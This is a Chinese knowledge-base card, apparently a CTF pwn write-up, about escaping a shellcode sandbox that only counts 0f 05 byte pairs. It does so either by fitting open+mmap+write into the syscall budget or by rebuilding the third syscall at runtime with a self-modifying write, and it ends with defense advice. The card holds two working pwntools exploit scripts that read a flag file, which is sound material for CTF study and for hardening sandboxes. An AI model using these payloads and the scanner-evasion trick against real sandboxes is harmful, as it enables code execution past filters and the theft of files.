---
id: binary-pwn-sandbox-escape-syscall-count-limit-split-byte-selfmodify-open-mmap-write
title: 只限制「0f 05 连续出现次数」的 shellcode 沙箱：open+mmap+write 压到两次 syscall，第三次拆 0f/05 运行时拼接
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: shellcode-syscall-bytepair-count-limit-split-byte-selfmodify
tags:
- pwn
- shellcode
- sandbox-escape
- static-instruction-scan
- self-modifying-code
- seccomp
- openat
- sendfile
- orw
cve: []
severity: high
confidence: low
status: draft
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-T2-1
  verified_at: '2026-11-07T22:58:17+08:00'
  notes: 应拆分：①字节对 0f05 计数上限 2 下的拆字节自修改 syscall（mov byte ptr[rip],0x0f + 90 05，静态只看到 0f 90 05）；②open+mmap+write 压到 2 次 syscall（open 被放行、read 被禁时的读文件原语）；另有第三段 openat+sendfile 两次 syscall 变体（与本篇 seccomp dump 不符、默认 KILL，只能作通用思路）。三者各有前置与独立 PoC，按粒度规则应拆开。事实核对：img/14 的 mmap((void*)0x10000,0x10000,7,50,-1,0)+read(...,0xC3)+count_syscall_instructions(0x10000,4096)>2 与卡内一致；img/16 的 buf[i]==0x0F&&buf[i+1]==5 计数与卡内一致；img/18 seccomp-tools dump 确为 A>=0x40000000 KILL，仅放行 write/open/stat/fstat/lstat/poll/lseek/mmap/mprotect，read 与 openat/sendfile 均不放行——卡内『原文方法一在本 dump 下会被 KILL』判断正确。
url: /docs/binary/pwn/sandbox-escape/binary-pwn-sandbox-escape-syscall-count-limit-split-byte-selfmodify-open-mmap-write/
draft: false
kb_aliases:
- count_syscall_instructions
- 连续 syscall 数量限制绕过
- 拆字节拼 syscall
- 90 05 运行时补 0f
- open mmap write 读 flag
- openat sendfile 两次 syscall
---

## 一句话结论

程序把固定地址 `0x10000` 的 RWX 页交给 `read` 读入的 shellcode 直接执行，执行前用 `count_syscall_instructions(buf, 4096)` 统计「相邻两字节等于 `0x0f 0x05`（x86-64 `syscall` 编码）」的次数，`> 2` 就 `exit(-1)`；这是纯静态字节对计数，不理解指令边界，因此要么把整条链压到两次 `syscall`，要么在第三次调用处把 `0f 05` 拆成「高位 `0x05` + 运行时用 `mov byte ptr [rip], 0x0f` 把前一个 `0x90` 改成 `0x0f`」，静态扫描看不到 `0f 05`，运行时仍执行真正的 `syscall`。

## 原理

- **RWX 固定页 + 输入即代码**：`main` 里 `fork()` 后父进程 `mmap((void*)0x10000, 0x10000, 7, 50, -1, 0)`（读写执行、`MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS`，固定映射到 `0x10000`）、`read(0, (void*)0x10000, 0xC3)`（最多 195 字节），然后 `count_syscall_instructions(0x10000LL, 4096LL)`，若返回值 `> 2` 则 `exit(-1)`，否则 `sandbox()` 后直接 `((void(*)())0x10000)()`。输入长度短、页面可写可执行，这同时允许「压缩 syscall 数」和「运行时改自己的代码」。
- **扫描器数与指令无关**：反编译为 `v3 = 0; for (i = 0; i < n - 1; ++i) if (buf[i] == 0x0F && buf[i+1] == 5) ++v3; return v3;`，比较的是**任意位置相邻两字节**，既不反汇编，也不判断这两字节是不是一条完整指令的操作码；因此把 `0f 05` 拆到不相邻的位置，或让它由运行时写入的字节拼成，都不会被计入。
- **真正的沙箱是后面装的 BPF**：`seccomp-tools dump` 的结构（原文图）为 `A = sys_number`，`A >= 0x40000000` 则 KILL，随后逐项比较并只让 `write(1)`、`open(2)`、`stat(4)`、`fstat(5)`、`lstat(6)`、`poll(7)`、`lseek(8)`、`mmap(9)`、`mprotect(10)` 跳到 `return ALLOW`，其余落到 `return KILL`。也就是说这是一份**白名单且默认 KILL**，`read` 不在名单里（原文「只是禁用了 read」的说法只对「读文件」这一动作成立，并不等于其余调用都放行）。
- **方案一（原文方法二，与 dump 一致）：open + mmap + write**。`open("flag", O_RDONLY)` 拿到 fd，`mmap(0x20000, 0x1000, 1, 1, fd, 0)` 把文件内容映射成可读页，再 `write(1, 0x20000, 0x50)` 输出——三个系统调用全部在白名单内；前两次 `syscall` 用正常编码（2 次，恰好达到上限），第三次改用拆字节编码，全程 `0f 05` 出现次数不超过 2。
- **拆字节的编码细节**：写指令 `mov byte ptr [rip], 0x0f` 的机器码是 `c6 05 disp32 0f`，`disp32 = 0` 时目标就是紧随其后的那一字节；payload 在该指令后放 `\x90\x05`，指令执行后把 `0x90` 改写成 `0x0f`，RIP 随后指向被改写的位置，于是 `0f 05` 被解码为一条 `syscall`（`\x05` 原是拆开放置的高位字节）。静态扫描看到的是 `... 0f 90 05`，`0f` 后面跟的是 `90` 而不是 `05`，因此不计入；这也解释了 autores 为什么要「用 `\x90` 对齐机器码」。
- **方案二（原文方法一，需按目标 dump 复核）：openat + sendfile 压到两次 syscall**。`openat(AT_FDCWD, "./flag", O_RDONLY)` + `sendfile(1, fd, NULL, 0x100)` 不经过用户态缓冲区即可把文件内容送到 stdout，只要两条 `syscall`，也不需要被禁的 `read`。**但本条路径用到的 `openat`(257) 与 `sendfile`(40) 并不在本篇 seccomp dump 的放行名单里（默认 KILL），因此该方法只能作为「若目标 dump 恰好放行这两个调用」的通用压缩思路，不能当作本篇已打通的证据。**
- **为什么必须压缩或拆分**：扫描上限 2 是出题者刻意设置的约束，正常 ORW（open/read/write）三段式会被直接 `exit`；绕过点全部落在「扫描层只做字节计数」这个实现缺陷上，与内核 seccomp 无关。

## 触发条件

- 用户可控字节被映射为可写可执行（本例是固定地址 `0x10000` 的 RWX 页），或存在等价的 JIT/代码页写入能力，且输入长度足够（本例 0xC3 字节）。
- 执行前的「防护」是静态扫描 `0x0f 0x05` 字节对并计数（阈值可为 0/2/N），检查发生在执行前且此后不再复检。
- 目标 seccomp 白名单里至少存在一组足以读文件的调用组合：`open`/`openat` + `mmap` + `write`，或 `open` + `sendfile`/`splice`；同时 `read` 被禁时仍能输出内容。
- 手上有目标二进制的 `seccomp-tools dump`（或能自行逆 BPF），否则无法确定哪些调用真的放行。

## 利用步骤

1. `checksec`、反编译确认：`mmap` 权限为 7（RWX）、固定地址 `0x10000`、`read` 上限 0xC3、`count_syscall_instructions` 的比较逻辑与阈值（`> 2`）、扫描与 `sandbox()` 的先后顺序。
2. `seccomp-tools dump ./pwn` 记录放行/杀死列表；重点看出默认动作是 ALLOW 还是 KILL（这是判断「只需压缩 syscall 数」还是「必须换调用」的关键）。
3. 若 `open`/`mmap`/`write` 在名单内：按 `open("flag", 0)`、`mmap(0x20000, 0x1000, PROT_READ, MAP_PRIVATE, fd, 0)`、`write(1, 0x20000, 0x50)` 布置寄存器；前两次 `syscall` 正常编码，第三次用 `mov byte ptr [rip], 0x0f` + `\x90\x05`。
4. 若 `openat`/`sendfile`（或 `openat2`）在白名单内：改用两次 syscall 链（`openat` 第 4 参数在 `r10`、`sendfile` 的 `offset` 传 `NULL`/0），无需自修改。
5. 本地静态校验：`assert payload.count(b'\x0f\x05') <= 2`，再用 `objdump -D` 或 capstone 确认拆分处的指令边界（`c6 05 00 00 00 00 0f 90 05`）。
6. 发送 payload；用 `strace`/`seccomp` KILL 日志确认没有调用越界被杀死，然后读取 `write`/`sendfile` 输出的 flag。

## PoC

方案一（原文方法二：open + mmap + write，第三次拆字节；未在本机复跑）：

```python
from pwn import *
context(os='linux', arch='amd64')
shellcode  = asm(shellcraft.open('flag', 0, 0))
shellcode += asm(shellcraft.mmap(0x20000, 0x1000, 1, 1, 'rax', 0))
shellcode += asm('''
    mov rax, 1
    mov rdi, 1
    mov rsi, 0x20000
    mov rdx, 0x50
    mov byte ptr [rip], 0x0f   /* c6 05 00 00 00 00 0f：把随后的 0x90 改成 0x0f */
''') + b'\x90\x05'             /* 静态看到 0f 90 05，不是 0f 05 */
assert shellcode.count(b'\x0f\x05') <= 2
p = remote(host, port)
p.send(shellcode)
p.interactive()
```

方案二（原文方法一：openat + sendfile 两次 syscall；能否成功取决于目标 dump 是否放行这两个调用）：

```python
from pwn import *
context(os='linux', arch='amd64')
sc = '''
    mov rax, 0x67616c662f2e      /* "./flag" */
    push rax
    xor rdi, rdi
    sub rdi, 100                /* AT_FDCWD */
    mov rsi, rsp
    xor edx, edx
    xor r10, r10
    push SYS_openat
    pop rax
    syscall                     /* #1 */

    mov rdi, 1                  /* stdout */
    mov rsi, 3                  /* openat 返回的 fd */
    push 0
    mov rdx, rsp                /* offset = NULL */
    mov r10, 0x100              /* count */
    push SYS_sendfile
    pop rax
    syscall                     /* #2 */
'''
payload = asm(sc)
assert payload.count(b'\x0f\x05') <= 2
```

说明：`mov byte ptr [rip], 0x0f` 的 `disp32` 必须为 0 才能命中紧随的 `0x90`；不同汇编器（AT&T/Intel）写法不同，落盘前要用 `asm` 结果核对字节序列。

## 变体与关联

- 变体：扫描改为「统计任意位置 `0x0f` 计数」或反汇编校验指令边界时，拆字节手法失效，只能压缩 syscall 数（`open`+`mmap`+`write`、`openat`+`sendfile`、`openat2`+`sendfile`、`open`+`splice`）。
- 变体：阈值为 0（完全不允 `0f 05`）时，每一处 `syscall` 都要拆；阈值较大时可以不拆，直接写常规 ORW。
- 变体：seccomp 是黑名单时，找漏掉的等价调用（`openat2`、`sendfile`、`splice`、`execveat`）；白名单时则只能在名单内组合。
- 关联：[[binary-pwn-sandbox-escape-self-modifying-shellcode-seccomp-orw]]（同为「静态扫描 `0f 05` + 自修改」，但那篇用 `inc byte ptr [rip]` 与 `.byte 0x0e, 0x05`、阈值是「一处都不许」、沙箱是 openat/read/write/exit 白名单）、[[binary-pwn-sandbox-escape-seccomp-openat2-pipe-splice]]（open/openat 被禁时改用 openat2 + pipe/splice）、[[binary-pwn-sandbox-escape-seccomp-execveat-shell-builtin-read]]（黑名单漏调用的绕过）、[[ctf-pwn-int16-length-sign-bypass-sprintf-format-canary-orw]]（openat+sendfile 读 flag 的 ORW 变体）。
- 边界：`openat` 第 4 参数在 `r10`；`sendfile` 的 `offset` 为 `NULL` 表示从当前位置读；RWX 不可得或输入不可写代码页时，自修改方案不成立。

## 检测与防御

- 检测（设计侧）：只做「字节对计数」的静态扫描不是安全边界，且阈值语义（`>2`）本身就是可绕过的数量限制；应改用反汇编器逐条验证并禁止 `syscall`/`sysenter`/`int 0x80`，或把限制下沉到系统调用级策略。
- 检测（运行时）：用 seccomp/Landlock 白名单收紧到必要调用与路径参数，而不是依赖用户态扫描；对 `sendfile`/`splice` 这类零拷贝搬运单独限制，避免「禁用 read 却放行等价的文件到 socket 搬运」。
- 修复：不给 RWX 页（W^X：先写后 `mprotect` 为 RX，或 JIT 双映射）；执行用户字节前做指令级校验与规范化；flag 文件权限最小化。
- 加固：`SECCOMP_RET_KILL_PROCESS` 作为默认动作并显式列出允许的系统调用；对提交的 shellcode 在独立低权限进程/沙箱中运行；CTF 场景下把「扫描阈值」与真实过滤器一起测试，避免把浅层检查当防线。
